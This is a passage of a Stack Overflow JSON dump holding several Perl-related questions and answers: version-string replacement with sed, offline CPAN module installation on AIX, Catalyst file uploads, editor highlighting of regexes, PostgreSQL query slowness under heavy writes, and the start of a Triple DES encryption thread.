"https://stackoverflow.com/users/203118/phpguru"}, "edited": false, "score": 0, "creation_date": 1497030712, "post_id": 44422004, "comment_id": 75924654, "body": "Tested on my environment - it doesn&#39;t work. No clue why. It&#39;s driving me nuts."}], "tags": [], "owner": {"reputation": 1254, "user_id": 2099489, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/toXzs.jpg?s=128&g=1", "display_name": "Miguel Ortiz", "link": "https://stackoverflow.com/users/2099489/miguel-ortiz"}, "is_accepted": false, "score": -1, "last_activity_date": 1496925091, "last_edit_date": 1496925091, "creation_date": 1496866471, "answer_id": 44422004, "question_id": 44421118, "link": "https://stackoverflow.com/questions/44421118/how-to-write-a-dynamic-string-replacement-in-git-bash/44422004#44422004", "title": "How to write a dynamic string replacement in git bash?", "body": "<p>Hi @phpguru I would follow the <a href=\"https://en.wikipedia.org/wiki/KISS_principle\" rel=\"nofollow noreferrer\">KISS principle</a>.</p>\n\n<p><strong><a href=\"http://sed.sourceforge.net/sedfaq6.html\" rel=\"nofollow noreferrer\">Using sed</a> and avoiding perl</strong></p>\n\n<blockquote>\n  <p>6.3. When should I use sed?</p>\n  \n  <p>When you need a small, fast program to modify words, lines, or blocks\n  of lines in a textfile.</p>\n</blockquote>\n\n<pre><code>function tag() {\n    tagname=\"$1\"\n    sed -i -e \"s:v[0-9]\\.[0-9]\\.[0-9]\\+:$tagname:g\" test.php\n}\n</code></pre>\n\n<p><strong>Output in my environment:</strong></p>\n\n<pre><code>m.ortiz.montealegre@CPX-XYR3G1DTHBU MINGW64 ~\n$ cat .bash_profile\nfunction tag() {\n\n    tagname=\"$1\"\n    sed -i -e \"s:v[0-9]\\.[0-9]\\.[0-9]\\+:$tagname:g\" test.php\n}\n\nm.ortiz.montealegre@CPX-XYR3G1DTHBU MINGW64 ~\n$ cat test.php\n'version' =&gt; 'v1.1.023,\n\nm.ortiz.montealegre@CPX-XYR3G1DTHBU MINGW64 ~\n$ tag v1.1.024\n\nm.ortiz.montealegre@CPX-XYR3G1DTHBU MINGW64 ~\n$ cat test.php\n'version' =&gt; 'v1.1.024,\n</code></pre>\n"}], "owner": {"reputation": 2241, "user_id": 203118, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b09bcf1e6791d661b5b4ed2f06a40d3c?s=128&d=identicon&r=PG", "display_name": "phpguru", "link": "https://stackoverflow.com/users/203118/phpguru"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 875, "favorite_count": 0, "accepted_answer_id": 44421377, "answer_count": 2, "score": 1, "last_activity_date": 1496925091, "creation_date": 1496863165, "question_id": 44421118, "link": "https://stackoverflow.com/questions/44421118/how-to-write-a-dynamic-string-replacement-in-git-bash", "title": "How to write a dynamic string replacement in git bash?", "body": "<p>This is on Windows 10 using the Linuxy environment provided with Git Bash.</p>\n\n<p>I have this line in my target source file:</p>\n\n<pre><code>'version' =&gt; 'v1.1.023',\n</code></pre>\n\n<p>I have this function in my <code>~/.bash_profile</code>:</p>\n\n<pre><code>function tag() {\n    ....\n    tagname=\"$1\"\n    cmd=\"s:v[0-9]\\\\.[0-9]\\\\.[0-9]+:$tagname:g;\"\n    perl -p -i -e \"$cmd\" config/app.php\n    ...\n}\n</code></pre>\n\n<p>When I run the command:</p>\n\n<pre><code>$ tag v.1.1.024\n</code></pre>\n\n<p>The string is not replaced, therefore the version is not updated in my code. I tried a very similar script with sed instead of perl. The file isn't getting changed. I tried the same perl replacement syntax on CentOS and it worked. Note that the double-backslash appears to be required in order for the command to work on the next line when it's run in perl. That is to say, the variable string representation of the command has a double backslash so that it becomes a literal \".\" in the replacement.</p>\n\n<p>Any ideas? </p>\n"}, {"tags": ["perl", "curl"], "answers": [{"comments": [{"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1496865790, "post_id": 44421286, "comment_id": 75842123, "body": "&quot;Surely you don&#39;t think all the sources of all the CPAN modules are stored on your system?&quot; \u2014 <a href=\"http://www.cpan.org/misc/how-to-mirror.html\" rel=\"nofollow noreferrer\">All 22Gb of them</a>"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1496876471, "post_id": 44421286, "comment_id": 75846590, "body": "And, of course, there is <a href=\"https://metacpan.org/pod/CPAN::Mini\" rel=\"nofollow noreferrer\">CPAN::Mini</a>. But, seriously, this question has the flavor of &quot;I unplugged the computer, why won&#39;t it turn on?&quot;"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1496865466, "last_edit_date": 1592644375, "creation_date": 1496863739, "answer_id": 44421286, "question_id": 44421074, "link": "https://stackoverflow.com/questions/44421074/lwpcurl-installation-trying-to-connect-to-internet/44421286#44421286", "title": "LWP::Curl installation trying to connect to internet", "body": "<blockquote>\n<p>Our AIX server is not connected to internet.</p>\n</blockquote>\n<p>I would have thought it was obvious that <code>cpan</code> cannot work without a connection to the internet. Surely you don't think all the sources of all the CPAN modules are stored on your system?</p>\n<p>But if you want to install random Perl modules on an isolated system then you will have to do exactly that. I suggest you take a look at <a href=\"https://metacpan.org/pod/CPAN::Mini\" rel=\"nofollow noreferrer\"><code>CPAN::Mini</code></a>. If you install it on a machine that <em>is</em> connected to the internet and use it to build a mirroe then you can copy the mirror over to your offline system and use that to install modules</p>\n<p>An alternative would be to download the .tar.gz package files of the modules manually (for instance from <a href=\"http://search.cpan.org/%7Elorn/LWP-Curl-0.14/\" rel=\"nofollow noreferrer\"><code>LWP-Curl-0.14</code></a>) copy them over to your AIX system and install from there using the process described in <a href=\"http://perldoc.perl.org/perlmodinstall.html\" rel=\"nofollow noreferrer\"><code>perlmodinstall</code></a></p>\n<p>But note that doing things this way removes much of the convenience of <code>cpan</code>, in particular you must establish any missing dependencies (perhaps using the <a href=\"http://deps.cpantesters.org/\" rel=\"nofollow noreferrer\"><em>CPAN Dependencies</em></a> site) and download and install those in the same way. You will also have to be much more careful about keeping modules up to date, as all of that must be done manually too</p>\n"}], "owner": {"reputation": 1, "user_id": 8008256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a4259c2ef9f86b21c85e8507428005d?s=128&d=identicon&r=PG&f=1", "display_name": "sasen7", "link": "https://stackoverflow.com/users/8008256/sasen7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 230, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1496865635, "creation_date": 1496862996, "last_edit_date": 1496865635, "question_id": 44421074, "link": "https://stackoverflow.com/questions/44421074/lwpcurl-installation-trying-to-connect-to-internet", "title": "LWP::Curl installation trying to connect to internet", "body": "<p></p>\n\n<p>My team is trying to install the <code>LWP::Curl</code> module on\nan AIX server and is facing an issue.</p>\n\n<p>We are using Perl v5.8.8 and are trying to install <code>LWP::Curl</code> v0.14.<br>\nWe have successfully installed <strong>Curl v7.40</strong> on our AIX server.  </p>\n\n<p>During installation of <code>LWP::Curl</code> it seems that the <code>Curl.pm</code> package is trying to connect to internet and is unable to do so. Our AIX server is not connected to internet.</p>\n\n<ul>\n<li><p>Is this connection necessary?   </p></li>\n<li><p>Can we bypass this connection and still install the module? </p></li>\n</ul>\n\n<p>I have posted excerpts from the log</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>*** Your host cannot resolve the domain name 'cpan.org', which  \n    probably means the Internet connections are unavailable.\n==&gt; Should we try to install the required module(s) anyway? [n] y \n</code></pre>\n\n<p>if we  select \u2018Y\u2019  search the dependencies on internet ('cpan.org' )</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>*** Installing Test::Exception...\nCPAN: Storable loaded ok\nGoing to read /home/root/.cpan/Metadata\nWarning: Found only 0 objects in /home/root/.cpan/Metadata\nCPAN: LWP::UserAgent loaded ok\nFetching with LWP:\n  ftp://ftp.perl.org/pub/CPAN/authors/01mailrc.txt.gz\nLWP failed with code[500] message[LWP::Protocol::MyFTP: Bad hostname 'ftp.perl.org']\nFetching with Net::FTP:\n  ftp://ftp.perl.org/pub/CPAN/authors/01mailrc.txt.gz\nIssuing \"/usr/bin/ftp -n\"\nftp : Unknown host ftp.perl.org\nNot connected.\nLocal directory now /home/root/.cpan/sources/authors\nNot connected.\nNot connected.\nNot connected.\nNot connected.\nNot connected.\nNot connected.\nBad luck... Still failed!\nCan't access URL ftp://ftp.perl.org/pub/CPAN/authors/01mailrc.txt.gz.\n</code></pre>\n"}, {"tags": ["mysql", "perl", "file", "upload", "catalyst"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 3, "creation_date": 1496860448, "post_id": 44420235, "comment_id": 75839052, "body": "Yes. Of course. Are you using DBIx::Class or just a plain DBI handle? Do you want to store the whole file content, or just the name, path and extension? Are those files uploaded by the user, or are they in your local file system? If the latter, why do you need them in the DB? Can you not work with the file system directly? Are they related to your other data?"}, {"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496862244, "post_id": 44420235, "comment_id": 75840092, "body": "Hi! Thanks for your answer.  1. DBIx::Class 2. just name, path and extension (I dont want my DB to get too bold) 3. The files are uploaded by the users.  Hope it helps :) and thanks again"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496865357, "post_id": 44420235, "comment_id": 75841903, "body": "Ok. That sounds straight-forward. You should have a DBIC based model in your Catalyst app. All you need to do is use it in a controller and pass the data in. It&#39;s really hard to tell you anything else. We don&#39;t know what exactly you are struggling with, what your level of expertise is or if you actually tried it yourself. Noone is just going to write code for you though, especially since there is not enough information to do that. Sorry."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1496865793, "post_id": 44420235, "comment_id": 75842125, "body": "So... what is the question? Are you asking how to insert a record into a database table?"}, {"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "edited": false, "score": 0, "creation_date": 1496865877, "post_id": 44420235, "comment_id": 75842171, "body": "I&#39;ll edit the question for better understanding.  Thanks!"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496873040, "post_id": 44420235, "comment_id": 75845403, "body": "Well, where are the files? That&#39;s important to download them."}, {"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "edited": false, "score": 0, "creation_date": 1496940215, "post_id": 44420235, "comment_id": 75880313, "body": "Haven&#39;t tested it yet, but it seems that I can config the Catalyst app to have a tmp directory, with:     <code>__PACKAGE__-&gt;config( uploadtmp =&gt; &#39;&#47;path&#47;to&#47;tmpdir&#39; );</code>  And then use the copy_to method of the $upload object to copy it to another folder in my app directory (e.g: myapp/files/)."}], "answers": [{"tags": [], "owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "is_accepted": false, "score": 2, "last_activity_date": 1497650473, "creation_date": 1497650473, "answer_id": 44598584, "question_id": 44420235, "link": "https://stackoverflow.com/questions/44420235/store-files-in-database-with-dbic-using-catalyst/44598584#44598584", "title": "Store files in database with DBIC using Catalyst", "body": "<p>The solution was pretty straight-forward. </p>\n\n<ul>\n<li>First Make sure your 'tmp' folder is configured in the Catalyst app file (e.g: MyApp.pm).</li>\n<li><p>Now, use Catalyst::Request::Upload to create the file object with the uploaded file. Sort of...</p>\n\n<pre><code> my $upload = $req-&gt;upload('input_field_name');\n</code></pre></li>\n<li><p>Now make sure you get all the data you want to store from the file. I, personally, got just the filename, MIME Type and size.</p>\n\n<pre><code>my $filename = $upload-&gt;filename;\nmy $size = $upload-&gt;size;\nmy $type = $upload-&gt;type;\n</code></pre></li>\n<li><p>Store into the database.</p></li>\n<li><p>Now, create a folder within the public content of the page to copy the files to, and perform the copy like:</p>\n\n<pre><code>$upload-&gt;copy_to('path/to/the/public/folder');\n</code></pre></li>\n<li><p>To retrieve the files, just create a link with the base URL to the public folder and the filename you stored in the database. </p></li>\n</ul>\n\n<p>Hope it helps someone... it was pretty obvious, though; but it cracked my head a little. </p>\n"}], "owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1497650473, "creation_date": 1496860142, "last_edit_date": 1496866666, "question_id": 44420235, "link": "https://stackoverflow.com/questions/44420235/store-files-in-database-with-dbic-using-catalyst", "title": "Store files in database with DBIC using Catalyst", "body": "<p>I'm using Perl Catalyst framework to build an application that needs to store several files in a MySQL database (among other things). I want to store the name, path, extension, etc of the files to retrieve them later; because they are supposed to be accessible from the application (e.g: a PDF document uploaded for someone, must be available for download later). Can I do this? I found several ways to do it in PHP, but none for perl. Any ideas?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I know I can access to some information using Catalyst::Request::Upload. I used this in the past for BLOB storage, but I dont't know how to get file information nor how to know where does catalyst store tmp files. </p>\n\n<p>So, basically, the questions that arise when trying to this are:</p>\n\n<ol>\n<li>How to know where are my files being stored once I submit them?</li>\n<li>How to copy these files (which I assume go to a tmp folder somewhere) to a folder in my computer/server?</li>\n<li>How to retrieve these files once I have them stored?</li>\n</ol>\n\n<p><strong>EDIT 2</strong></p>\n\n<p>I've checked again the documentation for Catalyst::Request::Upload (<a href=\"http://search.cpan.org/~jjnapiork/Catalyst-Runtime-5.90114/lib/Catalyst/Request/Upload.pm\" rel=\"nofollow noreferrer\">http://search.cpan.org/~jjnapiork/Catalyst-Runtime-5.90114/lib/Catalyst/Request/Upload.pm</a>) and found out how to know <strong>where are my files being stored</strong> and <strong>how to copy them to a new non-tmp location</strong>. The only question that remains:</p>\n\n<p><strong>How do I generate a download link for these files??</strong></p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "edited": false, "score": 0, "creation_date": 1496863392, "post_id": 44420644, "comment_id": 75840766, "body": "@J.P. If this solved your problem please accept the answer by ticking the check mark \u2705. Thank you. Welcome to Stack Overflow :-)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "edited": false, "score": 0, "creation_date": 1496949487, "post_id": 44420644, "comment_id": 75885375, "body": "@J.P.  Also note that <i>sometimes</i> you have to try other characters in that comment, as <code>&#47;</code> doesn&#39;t help.  It depends on why the pattern breaks the highlighter, and it&#39;s usually about a non-letter character that appears (perhaps repeatedly) in the pattern. The <code>#&#47;</code> does help most of the time. (If it doesn&#39;t I just try others, like <code>#&#39;</code> or <code>#{</code> ...)"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 1, "last_activity_date": 1496861484, "creation_date": 1496861484, "answer_id": 44420644, "question_id": 44420090, "link": "https://stackoverflow.com/questions/44420090/perl-sublime-text-format-off-when-using-regex-in-source/44420644#44420644", "title": "Perl Sublime Text format off when using Regex in source", "body": "<p>Just put a comment with an additional slash there.</p>\n\n<pre><code>if($file =~ /$pattern/ ) { # /\n        my $originalname = $file =~ s/$pattern//r; # /\n</code></pre>\n\n<p>Not every syntax highlighter is perfect. The one Stack Overflow uses also does not get this right, as you can see above.</p>\n"}], "owner": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 44420644, "answer_count": 1, "score": 1, "last_activity_date": 1496863336, "creation_date": 1496859577, "last_edit_date": 1496863336, "question_id": 44420090, "link": "https://stackoverflow.com/questions/44420090/perl-sublime-text-format-off-when-using-regex-in-source", "title": "Perl Sublime Text format off when using Regex in source", "body": "<p>I am pretty new at both Perl and Sublime. I have a line of code using Regex Find and Replace and everything below it is now Yellow as if it's a quoted string.</p>\n\n<p>How should this line be written so that it both works and doesn't mess up the rest of my code visually?</p>\n\n<p>The file runs without error.</p>\n\n<pre><code>if($file =~ /$pattern/ ) {\n        my $originalname = $file =~ s/$pattern//r;\n</code></pre>\n\n<p>I've tried putting tick and quotes around the actual pattern which fixes the sublime formatting but breaks the code.</p>\n\n<p>I think its a Sublime problem as TextMate doesn't exhibit the same issue.</p>\n"}, {"tags": ["python", "postgresql", "perl"], "comments": [{"owner": {"reputation": 18763, "user_id": 472495, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/4rtxd.png?s=128&g=1", "display_name": "halfer", "link": "https://stackoverflow.com/users/472495/halfer"}, "edited": false, "score": 1, "creation_date": 1496858236, "post_id": 44418920, "comment_id": 75837885, "body": "Why is it impossible to query the table when it is being written to? Would you update the question with that information? What happens when you run the read query? Are you using Python or Perl? Please only use the tag that relates to the technology you&#39;re using."}, {"owner": {"reputation": 173, "user_id": 1586123, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/908defd9349adfdf0df02fe4c660dca0?s=128&d=identicon&r=PG", "display_name": "zad0xlik", "link": "https://stackoverflow.com/users/1586123/zad0xlik"}, "reply_to_user": {"reputation": 18763, "user_id": 472495, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/4rtxd.png?s=128&g=1", "display_name": "halfer", "link": "https://stackoverflow.com/users/472495/halfer"}, "edited": false, "score": 0, "creation_date": 1496859915, "post_id": 44418920, "comment_id": 75838749, "body": "Thanks for the comment, I am writing to postgres via Perl but trying to read from table via python. That&#39;s why I kept them there."}, {"owner": {"reputation": 18763, "user_id": 472495, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/4rtxd.png?s=128&g=1", "display_name": "halfer", "link": "https://stackoverflow.com/users/472495/halfer"}, "edited": false, "score": 0, "creation_date": 1496860083, "post_id": 44418920, "comment_id": 75838832, "body": "OK, getting there. Please update the question with what &quot;very slow&quot; means, and what timing you would like to achieve. &quot;Impossible&quot; seems to be the wrong word, since you say that read queries are working."}, {"owner": {"reputation": 22250, "user_id": 191332, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/02beb265e9a7867cc068139700270dbc?s=128&d=identicon&r=PG&f=1", "display_name": "Szymon Lipi\u0144ski", "link": "https://stackoverflow.com/users/191332/szymon-lipi%c5%84ski"}, "edited": false, "score": 0, "creation_date": 1496860329, "post_id": 44418920, "comment_id": 75838986, "body": "As in most cases: check the plan of both queries, the ones that insert the data, and the ones that select them. Sometimes the inserts can be so slow, due to some advanced checks, that the whole machine can be slow, so selects can be slow too. You can check the query plan with explain, or explain analyse <a href=\"https://www.postgresql.org/docs/current/static/sql-explain.html\" rel=\"nofollow noreferrer\">postgresql.org/docs/current/static/sql-explain.html</a>."}, {"owner": {"reputation": 22250, "user_id": 191332, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/02beb265e9a7867cc068139700270dbc?s=128&d=identicon&r=PG&f=1", "display_name": "Szymon Lipi\u0144ski", "link": "https://stackoverflow.com/users/191332/szymon-lipi%c5%84ski"}, "edited": false, "score": 0, "creation_date": 1496860422, "post_id": 44418920, "comment_id": 75839038, "body": "Show the table structure, the indexes, and try adding <code>order by something</code> at the end. With a proper index, it can speed up."}, {"owner": {"reputation": 173, "user_id": 1586123, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/908defd9349adfdf0df02fe4c660dca0?s=128&d=identicon&r=PG", "display_name": "zad0xlik", "link": "https://stackoverflow.com/users/1586123/zad0xlik"}, "edited": false, "score": 0, "creation_date": 1496867475, "post_id": 44418920, "comment_id": 75842998, "body": "Wouldn&#39;t I have to re-index every time my table is update with new information?"}], "answers": [{"tags": [], "owner": {"reputation": 125670, "user_id": 6464308, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/12PVX.jpg?s=128&g=1", "display_name": "Laurenz Albe", "link": "https://stackoverflow.com/users/6464308/laurenz-albe"}, "is_accepted": false, "score": 0, "last_activity_date": 1496918833, "creation_date": 1496918833, "answer_id": 44433624, "question_id": 44418920, "link": "https://stackoverflow.com/questions/44418920/how-to-query-a-write-heavy-table-in-postgresql/44433624#44433624", "title": "How to query a write-heavy table in PostgreSQL?", "body": "<p>Check if your I/O subsystem is under stress &ndash; that would explain the time it takes.</p>\n\n<p>You can gain something if you avoid sequential scans by using indexes, but that will slow down insertion considerably.</p>\n\n<p>There is no free lunch here.</p>\n\n<p>You could try to add enough RAM so that the table is cached, that will speed up the queries considerably.</p>\n"}], "owner": {"reputation": 173, "user_id": 1586123, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/908defd9349adfdf0df02fe4c660dca0?s=128&d=identicon&r=PG", "display_name": "zad0xlik", "link": "https://stackoverflow.com/users/1586123/zad0xlik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 604, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1496918833, "creation_date": 1496855519, "last_edit_date": 1496867970, "question_id": 44418920, "link": "https://stackoverflow.com/questions/44418920/how-to-query-a-write-heavy-table-in-postgresql", "title": "How to query a write-heavy table in PostgreSQL?", "body": "<p>I have a PostgreSQL table that records on average ~6 million records throughout the day. It take a very long time to query the table as the records are being recorded. Is there a way to create a streamer from that table where it would post new records? I want to be able to stream changes to my website as they are being recorded.</p>\n\n<p>The reason it takes so long to query the table in postgres is because I have ~550 simultaneous threaded connections performing insert from different sources. Each thread does specific analysis on the data and stores information that is valuable. I scrape, quickly analyze and load the data using Perl, but building the querying from postgres table in Python. </p>\n\n<p>During loading time, even if I query (read query) the table through SQL via pgAdmin:</p>\n\n<pre><code>select var1, var2, var3 from pg_table \nwhere filter = 'xyz'\n</code></pre>\n\n<p>or even</p>\n\n<pre><code>select * from pg_table limit 100\n</code></pre>\n\n<p>the query is very slow, meaning the results take ~4 minutes to return. When table is not being loaded with data, it takes ~3 seconds.</p>\n\n<p>BTW thank you for you all your suggestions. I just ran an explain analyze on my table as it's being loaded with data. Here is the query:</p>\n\n<pre><code>EXPLAIN ANALYZE select count(call_option_symbol) from optionsputnik;\n</code></pre>\n\n<p>Here are the results:</p>\n\n<pre><code>QUERY PLAN\nAggregate  (cost=357092.30..357092.31 rows=1 width=51) (actual time=342775.893..342775.893 rows=1 loops=1)\n  -&gt;  Seq Scan on optionsputnik  (cost=0.00..342868.24 rows=5689624 width=51) (actual time=0.025..341802.509 rows=5686946 loops=1)\nPlanning time: 415.781 ms\nExecution time: 342775.974 ms\n</code></pre>\n\n<p>I will try and an index to the table, which I know will speed-up the query time but will not make interactive (process request from web, query table and return).</p>\n\n<p>This is the query plan results when nothing is being written to the table:</p>\n\n<pre><code>QUERY PLAN\nAggregate  (cost=463634.94..463634.95 rows=1 width=0) (actual time=2326.104..2326.104 rows=1 loops=1)\n  -&gt;  Seq Scan on optionsputnik  (cost=0.00..445164.95 rows=7387995 width=0) (actual time=0.029..1773.378 rows=7383752 loops=1)\nPlanning time: 0.045 ms\nExecution time: 2326.149 ms\n</code></pre>\n\n<p>Below is my table structure:</p>\n\n<pre><code>column_name,data_type,character_maximum_length\nload_time,character,30\ncall_option_symbol,character,50\ncall_bid,double precision,\ncall_ask,double precision,\ncall_bid_ask_size,character,50\ncall_last,character,50\ncall_delta,double precision,\ncall_volume,double precision,\ncall_open_interest,double precision,\nput_bid,double precision,\nput_ask,double precision,\nput_bid_ask_size,character,50\nput_last,character,50\nput_delta,double precision,\nput_volume,double precision,\nput_open_interest,double precision,\n</code></pre>\n\n<p>I was thinking of trying to split the table into n separate tables to reduce number of write connections at the same time. Is there anything else that I can try or test?  </p>\n"}, {"tags": ["c#", "perl", "encryption"], "comments": [{"owner": {"reputation": 1414, "user_id": 4828786, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c8d5c626ee16240cbb7b21cb1782fa9?s=128&d=identicon&r=PG", "display_name": "Kevin", "link": "https://stackoverflow.com/users/4828786/kevin"}, "edited": false, "score": 0, "creation_date": 1496852856, "post_id": 44417915, "comment_id": 75834981, "body": "This may or may not help, but I&#39;m guessing that the perl is probably using utf8 encoding instead of the ascii encoding you are using on the C# side. Change the C# to use utf8 encoding and give it another try."}, {"owner": {"reputation": 107760, "user_id": 451475, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a632afa4c11779c0cabd7df04eb26ba6?s=128&d=identicon&r=PG", "display_name": "zaph", "link": "https://stackoverflow.com/users/451475/zaph"}, "edited": false, "score": 0, "creation_date": 1496857292, "post_id": 44417915, "comment_id": 75837378, "body": "<b>Do not use Tripple DES for new work</b>, it is no longer considered secure , use AES (Advanced Encryption Standard). AES has essentially the same interface as 3DES so is no harder to use."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496858769, "post_id": 44418137, "comment_id": 75838162, "body": "That whole function is already provided by <code>use MIME::Base64 qw( decode_base64 );</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, 